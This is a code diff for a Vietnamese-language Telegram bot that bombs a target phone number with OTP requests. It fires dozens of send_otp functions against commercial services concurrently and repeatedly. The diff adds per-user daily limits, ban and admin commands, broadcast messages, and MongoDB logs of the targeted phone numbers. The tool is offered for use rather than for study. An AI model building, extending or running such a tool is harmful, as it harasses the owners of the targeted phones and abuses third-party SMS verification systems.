@@ -1,6 +1,6 @@
 import telebot
 from telebot.types import Message
-from flask import Flask
+from flask import Flask, request
 import threading
 import os
 import time
@@ -16,48 +16,48 @@ from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
 from threading import BoundedSemaphore
 import concurrent.futures
-import pymongo
 from pymongo import MongoClient
-from threading import Event
+from bson import ObjectId
+from datetime import datetime
 
-# Kết nối MongoDB
-MONGO_URI = os.environ.get("MONGODB_URI")
-if not MONGO_URI:
-    raise ValueError("Không tìm thấy biến môi trường MONGODB_URI. Vui lòng thiết lập trên Render Dashboard.")
+# ====================== CẤU HÌNH MONGODB ======================
+MONGODB_URI = "MONGODB_URI"
+client = MongoClient(MONGODB_URI)
+db = client['telegram_bot_db']
 
-client = MongoClient(MONGO_URI)
-db = client['spam_bot']  # hoặc tên database bạn muốn
-spams_collection = db['spams']
+# Các collections
 users_collection = db['users']
+spam_logs_collection = db['spam_logs']
+bot_settings_collection = db['bot_settings']
 
-# Admin ID từ environment variable
-ADMIN_ID = os.environ.get('ADMIN_ID')  # Set this to your Telegram user ID as string, e.g., '123456789'
+# Tạo index
+users_collection.create_index([('user_id', 1)], unique=True)
+spam_logs_collection.create_index([('timestamp', -1)])
 
-# Danh sách ongoing spams
-ongoing_spams = {}  # user_id: Event
+# Khởi tạo cài đặt bot nếu chưa có
+if bot_settings_collection.count_documents({}) == 0:
+    bot_settings_collection.insert_one({
+        'spam_enabled': True,
+        'admin_ids': [],  # Danh sách admin user_id
+        'max_spam_per_day': 10
+    })
 
-# Các hàm send_otp_via_... từ code gốc (giả sử copy đầy đủ, bao gồm tất cả các hàm đã định nghĩa)
-# Ở đây chỉ liệt kê một số để ví dụ, bạn cần copy tất cả từ code gốc
-
+# ====================== BIẾN TOÀN CỤC ======================
+spam_tasks = {}  # Lưu trữ các task spam đang chạy {chat_id: task}
 MAX_THREADS = 0.5
 semaphore = BoundedSemaphore(MAX_THREADS)
+
 # Danh sách các họ, tên đệm và tên phổ biến
 last_names = ['Nguyễn', 'Trần', 'Lê', 'Phạm', 'Võ', 'Hoàng']
 middle_names = ['Vân', 'Thị', 'Quang', 'Hoàng', 'Anh', 'Thanh']
 first_names = ['Nam', 'Tuấn', 'Hương', 'Linh', 'Long', 'Duy']
 
-# Tạo tên ngẫu nhiên
+# ====================== HÀM TIỆN ÍCH ======================
 def generate_random_name():
     last_name = random.choice(last_names)
-    middle_name = random.choice(middle_names) if random.choice([True, False]) else ''  # Optional middle name
+    middle_name = random.choice(middle_names) if random.choice([True, False]) else ''
     first_name = random.choice(first_names)
     return f"{last_name} {middle_name} {first_name}".strip()
-
-def generate_random_id():
-    def random_segment(length):
-        return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))
-    
-    return f"{random_segment(2)}7D7{random_segment(1)}6{random_segment(1)}E-D52E-46EA-8861-ED{random_segment(1)}BB{random_segment(2)}86{random_segment(3)}"
 
 def generate_random_id():
     return ''.join(random.choices(string.ascii_uppercase + string.digits, k=32))
@@ -65,9 +65,60 @@ def generate_random_id():
 def format_device_id(device_id):
     return f"{device_id[:8]}-{device_id[8:12]}-{device_id[12:16]}-{device_id[16:20]}-{device_id[20:]}"
 
-random_id = generate_random_id()
-formatted_device_id = format_device_id(random_id)
+def is_admin(user_id):
+    """Kiểm tra xem user có phải admin không"""
+    settings = bot_settings_collection.find_one({})
+    return user_id in settings.get('admin_ids', [])
 
+def get_user_info(user_id):
+    """Lấy thông tin user từ database hoặc tạo mới"""
+    user = users_collection.find_one({'user_id': user_id})
+    if not user:
+        user = {
+            'user_id': user_id,
+            'username': '',
+            'first_name': '',
+            'last_name': '',
+            'spam_count': 0,
+            'last_spam': None,
+            'created_at': datetime.now(),
+            'is_banned': False
+        }
+        users_collection.insert_one(user)
+    return user
+
+def log_spam_action(user_id, phone_number, count, success=True):
+    """Ghi log spam vào database"""
+    log_entry = {
+        'user_id': user_id,
+        'phone_number': phone_number,
+        'count': count,
+        'timestamp': datetime.now(),
+        'success': success,
+        'ip_address': None  # Có thể thêm IP nếu có
+    }
+    spam_logs_collection.insert_one(log_entry)
+    
+    # Cập nhật số lần spam của user
+    users_collection.update_one(
+        {'user_id': user_id},
+        {'$inc': {'spam_count': count}, '$set': {'last_spam': datetime.now()}}
+    )
+
+def check_spam_limit(user_id):
+    """Kiểm tra giới hạn spam trong ngày"""
+    settings = bot_settings_collection.find_one({})
+    max_per_day = settings.get('max_spam_per_day', 10)
+    
+    start_of_day = datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)
+    today_spam = spam_logs_collection.count_documents({
+        'user_id': user_id,
+        'timestamp': {'$gte': start_of_day}
+    })
+    
+    return today_spam < max_per_day
+
+# ====================== CÁC HÀM SEND OTP (GIỮ NGUYÊN) ======================
 def send_otp_via_sapo(sdt):
     cookies = {
         'landing_page': 'https://www.sapo.vn/',
@@ -3219,9 +3270,28 @@ def send_otp_via_takomo(sdt):
 ##################################################################################################################################################################################
 
 ##################################################################################################################################################################################
-def run(phone, i):
-    functions = [
-        send_otp_via_sapo, send_otp_via_viettel, send_otp_via_medicare, send_otp_via_tv360,
+
+# ====================== HÀM RUN SPAWN (CẬP NHẬT) ======================
+def run_spam(phone, count, chat_id, user_id):
+    """Hàm thực hiện spam với khả năng dừng"""
+    task_id = f"{chat_id}_{int(time.time())}"
+    spam_tasks[task_id] = {
+        'running': True,
+        'current_count': 0,
+        'total_count': count
+    }
+    
+    try:
+        for i in range(1, count + 1):
+            if not spam_tasks.get(task_id, {}).get('running', True):
+                bot.send_message(chat_id, f"🚫 Đã dừng spam cho số {phone}")
+                break
+            
+            spam_tasks[task_id]['current_count'] = i
+            
+            # Gọi các hàm spam (sử dụng ThreadPoolExecutor như cũ)
+            functions = [
+               send_otp_via_sapo, send_otp_via_viettel, send_otp_via_medicare, send_otp_via_tv360,
         send_otp_via_dienmayxanh, send_otp_via_kingfoodmart, send_otp_via_mocha, send_otp_via_fptdk,
         send_otp_via_fptmk, send_otp_via_VIEON, send_otp_via_ghn, send_otp_via_lottemart,
         send_otp_via_DONGCRE, send_otp_via_shopee, send_otp_via_TGDD, send_otp_via_fptshop,
@@ -3239,134 +3309,438 @@ def run(phone, i):
         send_otp_via_modcha35, send_otp_via_Bibabo, send_otp_via_MOCA, send_otp_via_pantio,
         send_otp_via_Routine, send_otp_via_vayvnd, send_otp_via_tima, send_otp_via_moneygo,
         send_otp_via_takomo, send_otp_via_paynet, send_otp_via_pico, send_otp_via_PNJ, send_otp_via_TINIWORLD,
-    ]
-    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
-        futures = [executor.submit(fn, phone) for fn in functions]
-        for future in concurrent.futures.as_completed(futures):
-            try:
-                future.result()
-            except Exception as exc:
-                print(f'Đã xảy ra lỗi: {exc}')
+            ]
+            
+            with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
+                futures = [executor.submit(fn, phone) for fn in functions]
+                for future in concurrent.futures.as_completed(futures):
+                    try:
+                        future.result()
+                    except Exception as exc:
+                        print(f'Đã xảy ra lỗi: {exc}')
+            
+            print(f"Spam thành công lần {i}/{count}")
+            
+            # Cập nhật tiến độ mỗi 5 lần
+            if i % 5 == 0:
+                bot.send_message(chat_id, f"📊 Tiến độ: {i}/{count} lần đã hoàn thành")
+            
+            if i < count:
+                for j in range(4, 0, -1):
+                    if not spam_tasks.get(task_id, {}).get('running', True):
+                        break
+                    sleep(1)
+        
+        # Ghi log sau khi hoàn thành
+        if spam_tasks.get(task_id, {}).get('running', True):
+            log_spam_action(user_id, phone, count, success=True)
+            bot.send_message(chat_id, f"✅ Hoàn thành spam {count} lần cho số {phone}")
+        else:
+            log_spam_action(user_id, phone, spam_tasks[task_id]['current_count'], success=False)
+    
+    except Exception as e:
+        bot.send_message(chat_id, f"❌ Lỗi khi spam: {str(e)}")
+        log_spam_action(user_id, phone, spam_tasks[task_id]['current_count'], success=False)
+    
+    finally:
+        if task_id in spam_tasks:
+            del spam_tasks[task_id]
 
-    print("Spam thành công lần :", i)
-    for j in range(4, 0, -1):
-        print(f"Vui lòng chờ {j} giây", end="\r")
-        sleep(1)
-
-# Hàm đăng ký user
-def register_user(message):
-    user_id = message.from_user.id
-    if not users_collection.find_one({'user_id': user_id}):
-        users_collection.insert_one({
-            'user_id': user_id,
-            'username': message.from_user.username,
-            'first_name': message.from_user.first_name,
-            'last_name': message.from_user.last_name,
-            'joined': datetime.now()
-        })
-
-# Phần bot Telegram
-
-TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')  # Replace the hardcoded TOKEN line with this
+# ====================== BOT TELEGRAM ======================
+TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
 if not TOKEN or ':' not in TOKEN:
     raise ValueError("Invalid or missing TELEGRAM_BOT_TOKEN environment variable")
 bot = telebot.TeleBot(TOKEN)
 
 @bot.message_handler(commands=['start'])
 def start(message: Message):
-    register_user(message)
-    bot.reply_to(message, "Chào! Sử dụng /spam <số điện thoại> <số lần> để bắt đầu /stop_spam để dừng.")
+    user_info = get_user_info(message.from_user.id)
+    welcome_text = f"""
+👋 Chào {message.from_user.first_name}!
+
+📱 Sử dụng lệnh:
+/spam <số điện thoại> <số lần> - Gửi spam OTP
+/mystats - Xem thống kê của bạn
+/help - Xem hướng dẫn
+
+🛑 Để dừng spam đang chạy: /stop
+
+{'👑 Lệnh Admin: /admin' if is_admin(message.from_user.id) else ''}
+    """
+    bot.reply_to(message, welcome_text)
 
 @bot.message_handler(commands=['help'])
 def help_command(message: Message):
-    bot.reply_to(message, "Lệnh: /spam <phone> <count>\n/stop_spam để dừng\nAdmin: /list_phones /list_users")
+    help_text = """
+📖 HƯỚNG DẪN SỬ DỤNG:
+
+1. Spam OTP:
+   /spam 0912345678 10
+
+2. Xem thống kê cá nhân:
+   /mystats
+
+3. Dừng spam đang chạy:
+   /stop
+
+4. Lệnh Admin (chỉ admin):
+   /admin - Menu admin
+   /stats - Thống kê tổng quan
+   /users - Danh sách người dùng
+   /logs <số điện thoại> - Xem log spam
+   /ban <user_id> - Cấm người dùng
+   /unban <user_id> - Bỏ cấm
+   /stopall - Dừng tất cả spam
+    """
+    bot.reply_to(message, help_text)
 
 @bot.message_handler(commands=['spam'])
 def spam(message: Message):
-    register_user(message)
+    user_id = message.from_user.id
+    user_info = get_user_info(user_id)
+    
+    # Kiểm tra user có bị ban không
+    if user_info.get('is_banned', False):
+        bot.reply_to(message, "🚫 Tài khoản của bạn đã bị khóa!")
+        return
+    
+    # Kiểm tra giới hạn spam
+    if not check_spam_limit(user_id):
+        bot.reply_to(message, "⚠️ Bạn đã đạt giới hạn spam trong ngày hôm nay!")
+        return
+    
     args = message.text.split()[1:]
     if len(args) != 2:
-        bot.reply_to(message, "Usage: /spam <phone> <count>")
+        bot.reply_to(message, "⚠️ Sai cú pháp. Ví dụ: /spam 0912345678 10")
         return
+    
     phone = args[0]
     try:
         count = int(args[1])
+        if count <= 0 or count > 50:
+            bot.reply_to(message, "⚠️ Số lần phải từ 1 đến 50")
+            return
     except ValueError:
-        bot.reply_to(message, "Count phải là số nguyên.")
+        bot.reply_to(message, "⚠️ Số lần phải là số nguyên")
         return
-
-    user_id = message.from_user.id
-    if user_id in ongoing_spams:
-        bot.reply_to(message, "Đang có spam đang chạy. Vui lòng dùng /stop_spam để dừng trước.")
+    
+    # Kiểm tra bot có đang bật spam không
+    settings = bot_settings_collection.find_one({})
+    if not settings.get('spam_enabled', True):
+        bot.reply_to(message, "⏸️ Tính năng spam tạm thời bị tắt bởi admin")
         return
+    
+    bot.reply_to(message, f"🚀 Bắt đầu spam đến {phone} {count} lần...")
+    
+    # Chạy spam trong thread riêng
+    threading.Thread(
+        target=run_spam,
+        args=(phone, count, message.chat.id, user_id),
+        daemon=True
+    ).start()
 
-    event = Event()
-    ongoing_spams[user_id] = event
-
-    def spam_thread():
-        completed = 0
-        for i in range(1, count + 1):
-            if event.is_set():
-                break
-            run(phone, i)
-            completed = i
-        del ongoing_spams[user_id]
-        # Lưu vào MongoDB
-        spams_collection.insert_one({
-            'phone': phone,
-            'user_id': user_id,
-            'username': message.from_user.username,
-            'time': datetime.now(),
-            'count': completed
-        })
-        bot.send_message(message.chat.id, f"Hoàn thành spam {completed} lần hoặc đã dừng.")
-
-    threading.Thread(target=spam_thread).start()
-    bot.reply_to(message, f"Bắt đầu spam đến {phone} {count} lần. Vui lòng chờ...")
-
-@bot.message_handler(commands=['stop_spam'])
+@bot.message_handler(commands=['stop'])
 def stop_spam(message: Message):
     user_id = message.from_user.id
-    if user_id in ongoing_spams:
-        ongoing_spams[user_id].set()
-        bot.reply_to(message, "Đang dừng spam...")
+    # Tìm và dừng task của user
+    task_keys = [k for k in spam_tasks.keys() if k.startswith(f"{message.chat.id}_")]
+    if task_keys:
+        for task_key in task_keys:
+            spam_tasks[task_key]['running'] = False
+        bot.reply_to(message, "⏹️ Đang dừng các task spam của bạn...")
     else:
-        bot.reply_to(message, "Không có spam đang chạy.")
+        bot.reply_to(message, "ℹ️ Không có task spam nào đang chạy")
 
-@bot.message_handler(commands=['list_phones'])
-def list_phones(message: Message):
-    if str(message.from_user.id) != ADMIN_ID:
-        bot.reply_to(message, "Chỉ admin mới sử dụng được lệnh này.")
+@bot.message_handler(commands=['mystats'])
+def my_stats(message: Message):
+    user_id = message.from_user.id
+    user_info = get_user_info(user_id)
+    
+    start_of_day = datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)
+    today_spam = spam_logs_collection.count_documents({
+        'user_id': user_id,
+        'timestamp': {'$gte': start_of_day}
+    })
+    
+    settings = bot_settings_collection.find_one({})
+    max_per_day = settings.get('max_spam_per_day', 10)
+    
+    stats_text = f"""
+📊 THỐNG KÊ CÁ NHÂN:
+
+👤 User ID: {user_id}
+📅 Ngày tham gia: {user_info.get('created_at').strftime('%d/%m/%Y')}
+🎯 Tổng số lần spam: {user_info.get('spam_count', 0)}
+📈 Hôm nay đã spam: {today_spam}/{max_per_day} lần
+⏰ Lần spam cuối: {user_info.get('last_spam').strftime('%H:%M %d/%m/%Y') if user_info.get('last_spam') else 'Chưa có'}
+🔓 Trạng thái: {'🚫 Bị khóa' if user_info.get('is_banned') else '✅ Hoạt động'}
+    """
+    bot.reply_to(message, stats_text)
+
+# ====================== LỆNH ADMIN ======================
+@bot.message_handler(commands=['admin'])
+def admin_panel(message: Message):
+    if not is_admin(message.from_user.id):
+        bot.reply_to(message, "🚫 Bạn không có quyền truy cập!")
         return
-    phones = spams_collection.distinct('phone')
-    if phones:
-        bot.reply_to(message, "Danh sách SDT đã từng spam:\n" + "\n".join(phones))
-    else:
-        bot.reply_to(message, "Chưa có SDT nào được spam.")
+    
+    admin_text = """
+👑 ADMIN PANEL:
 
-@bot.message_handler(commands=['list_users'])
+📊 /stats - Thống kê tổng quan
+👥 /users - Danh sách người dùng
+🔍 /logs <sdt> - Xem log spam
+⏸️ /toggle - Bật/tắt spam
+🔒 /ban <user_id> - Cấm người dùng
+🔓 /unban <user_id> - Bỏ cấm
+🛑 /stopall - Dừng tất cả spam
+📝 /broadcast <tin nhắn> - Gửi thông báo
+⚙️ /settings - Cài đặt bot
+    """
+    bot.reply_to(message, admin_text)
+
+@bot.message_handler(commands=['stats'])
+def admin_stats(message: Message):
+    if not is_admin(message.from_user.id):
+        return
+    
+    total_users = users_collection.count_documents({})
+    total_spam_logs = spam_logs_collection.count_documents({})
+    banned_users = users_collection.count_documents({'is_banned': True})
+    
+    # Thống kê 24h gần đây
+    last_24h = datetime.now() - timedelta(hours=24)
+    spam_last_24h = spam_logs_collection.count_documents({'timestamp': {'$gte': last_24h}})
+    
+    # Top 5 users spam nhiều nhất
+    pipeline = [
+        {'$group': {'_id': '$user_id', 'total_spam': {'$sum': '$count'}}},
+        {'$sort': {'total_spam': -1}},
+        {'$limit': 5}
+    ]
+    top_users = list(spam_logs_collection.aggregate(pipeline))
+    
+    top_text = "🏆 Top 5 người dùng:\n"
+    for i, user in enumerate(top_users[:5], 1):
+        user_info = users_collection.find_one({'user_id': user['_id']})
+        username = user_info.get('username', 'N/A') if user_info else 'N/A'
+        top_text += f"{i}. User {user['_id']} ({username}): {user['total_spam']} lần\n"
+    
+    stats_text = f"""
+📈 THỐNG KÊ TỔNG QUAN:
+
+👥 Tổng người dùng: {total_users}
+🚫 Người dùng bị cấm: {banned_users}
+📨 Tổng log spam: {total_spam_logs}
+⏰ Spam 24h qua: {spam_last_24h}
+🔄 Task đang chạy: {len(spam_tasks)}
+
+{top_text}
+    """
+    bot.reply_to(message, stats_text)
+
+@bot.message_handler(commands=['users'])
 def list_users(message: Message):
-    if str(message.from_user.id) != ADMIN_ID:
-        bot.reply_to(message, "Chỉ admin mới sử dụng được lệnh này.")
+    if not is_admin(message.from_user.id):
         return
-    users = list(users_collection.find({}, {'_id': 0, 'user_id': 1, 'username': 1, 'joined': 1}))
-    if users:
-        user_str = "\n".join([f"ID: {u['user_id']}, Username: {u['username']}, Joined: {u['joined']}" for u in users])
-        bot.reply_to(message, "Danh sách người dùng:\n" + user_str)
-    else:
-        bot.reply_to(message, "Chưa có người dùng nào.")
+    
+    page = 1
+    args = message.text.split()
+    if len(args) > 1:
+        try:
+            page = int(args[1])
+        except:
+            pass
+    
+    limit = 10
+    skip = (page - 1) * limit
+    
+    users = list(users_collection.find().sort('created_at', -1).skip(skip).limit(limit))
+    
+    users_text = f"👥 DANH SÁCH NGƯỜI DÙNG (Trang {page}):\n\n"
+    for user in users:
+        status = "🚫" if user.get('is_banned') else "✅"
+        users_text += f"{status} ID: {user['user_id']}\n"
+        users_text += f"   👤: {user.get('first_name', '')} {user.get('last_name', '')}\n"
+        users_text += f"   📊: {user.get('spam_count', 0)} lần spam\n"
+        users_text += f"   📅: {user.get('created_at').strftime('%d/%m/%Y')}\n"
+        users_text += "─" * 20 + "\n"
+    
+    users_text += f"\nSử dụng: /users {page+1} để xem trang tiếp theo"
+    bot.reply_to(message, users_text)
 
-# Phần Flask để chạy trên Render
+@bot.message_handler(commands=['logs'])
+def view_logs(message: Message):
+    if not is_admin(message.from_user.id):
+        return
+    
+    args = message.text.split()
+    if len(args) < 2:
+        bot.reply_to(message, "⚠️ Sử dụng: /logs <số điện thoại>")
+        return
+    
+    phone = args[1]
+    logs = list(spam_logs_collection.find({'phone_number': phone}).sort('timestamp', -1).limit(20))
+    
+    if not logs:
+        bot.reply_to(message, f"📭 Không tìm thấy log cho số {phone}")
+        return
+    
+    logs_text = f"📋 LOG SPAM CHO {phone}:\n\n"
+    for log in logs:
+        user_info = users_collection.find_one({'user_id': log['user_id']})
+        username = user_info.get('username', 'N/A') if user_info else 'N/A'
+        status = "✅" if log.get('success') else "❌"
+        logs_text += f"{status} {log['timestamp'].strftime('%H:%M %d/%m/%Y')}\n"
+        logs_text += f"   👤 User: {log['user_id']} ({username})\n"
+        logs_text += f"   🔢 Số lần: {log['count']}\n"
+        logs_text += "─" * 20 + "\n"
+    
+    bot.reply_to(message, logs_text)
+
+@bot.message_handler(commands=['ban'])
+def ban_user(message: Message):
+    if not is_admin(message.from_user.id):
+        return
+    
+    args = message.text.split()
+    if len(args) < 2:
+        bot.reply_to(message, "⚠️ Sử dụng: /ban <user_id>")
+        return
+    
+    try:
+        user_id = int(args[1])
+    except:
+        bot.reply_to(message, "⚠️ User ID phải là số")
+        return
+    
+    result = users_collection.update_one(
+        {'user_id': user_id},
+        {'$set': {'is_banned': True}}
+    )
+    
+    if result.modified_count > 0:
+        bot.reply_to(message, f"✅ Đã cấm user {user_id}")
+        # Thông báo cho user
+        try:
+            bot.send_message(user_id, "🚫 Tài khoản của bạn đã bị admin khóa!")
+        except:
+            pass
+    else:
+        bot.reply_to(message, f"⚠️ Không tìm thấy user {user_id}")
+
+@bot.message_handler(commands=['unban'])
+def unban_user(message: Message):
+    if not is_admin(message.from_user.id):
+        return
+    
+    args = message.text.split()
+    if len(args) < 2:
+        bot.reply_to(message, "⚠️ Sử dụng: /unban <user_id>")
+        return
+    
+    try:
+        user_id = int(args[1])
+    except:
+        bot.reply_to(message, "⚠️ User ID phải là số")
+        return
+    
+    result = users_collection.update_one(
+        {'user_id': user_id},
+        {'$set': {'is_banned': False}}
+    )
+    
+    if result.modified_count > 0:
+        bot.reply_to(message, f"✅ Đã bỏ cấm user {user_id}")
+    else:
+        bot.reply_to(message, f"⚠️ Không tìm thấy user {user_id}")
+
+@bot.message_handler(commands=['stopall'])
+def stop_all_spam(message: Message):
+    if not is_admin(message.from_user.id):
+        return
+    
+    # Dừng tất cả task
+    for task_id in spam_tasks:
+        spam_tasks[task_id]['running'] = False
+    
+    spam_tasks.clear()
+    bot.reply_to(message, "🛑 Đã dừng tất cả task spam đang chạy")
+
+@bot.message_handler(commands=['toggle'])
+def toggle_spam(message: Message):
+    if not is_admin(message.from_user.id):
+        return
+    
+    settings = bot_settings_collection.find_one({})
+    new_status = not settings.get('spam_enabled', True)
+    
+    bot_settings_collection.update_one(
+        {},
+        {'$set': {'spam_enabled': new_status}}
+    )
+    
+    status_text = "BẬT" if new_status else "TẮT"
+    bot.reply_to(message, f"🔧 Đã {status_text} tính năng spam")
+
+@bot.message_handler(commands=['broadcast'])
+def broadcast_message(message: Message):
+    if not is_admin(message.from_user.id):
+        return
+    
+    args = message.text.split()
+    if len(args) < 2:
+        bot.reply_to(message, "⚠️ Sử dụng: /broadcast <tin nhắn>")
+        return
+    
+    broadcast_msg = ' '.join(args[1:])
+    users = users_collection.find({}, {'user_id': 1})
+    
+    bot.reply_to(message, f"📢 Bắt đầu gửi thông báo đến {users.count()} người dùng...")
+    
+    success = 0
+    failed = 0
+    for user in users:
+        try:
+            bot.send_message(user['user_id'], f"📣 THÔNG BÁO TỪ ADMIN:\n\n{broadcast_msg}")
+            success += 1
+        except:
+            failed += 1
+        time.sleep(0.1)  # Tránh bị rate limit
+    
+    bot.reply_to(message, f"✅ Đã gửi: {success} | ❌ Thất bại: {failed}")
+
+# ====================== FLASK SERVER ======================
 app = Flask(__name__)
 
 @app.route('/')
 def home():
     return "Bot Telegram đang chạy!"
 
+@app.route('/stats')
+def web_stats():
+    """API xem thống kê"""
+    total_users = users_collection.count_documents({})
+    total_spam = spam_logs_collection.count_documents({})
+    return {
+        'total_users': total_users,
+        'total_spam_requests': total_spam,
+        'active_tasks': len(spam_tasks),
+        'status': 'running'
+    }
+
 def run_bot():
     bot.polling(none_stop=True)
 
 if __name__ == '__main__':
-    threading.Thread(target=run_bot).start()
+    # Tạo admin đầu tiên (thay YOUR_USER_ID bằng ID của bạn)
+    settings = bot_settings_collection.find_one({})
+    if not settings.get('admin_ids'):
+        bot_settings_collection.update_one(
+            {},
+            {'$set': {'admin_ids': [123456789]}}  # Thay 123456789 bằng user_id của bạn
+        )
+    
+    threading.Thread(target=run_bot, daemon=True).start()
     port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port, debug=True)
+    app.run(host='0.0.0.0', port=port, debug=False)
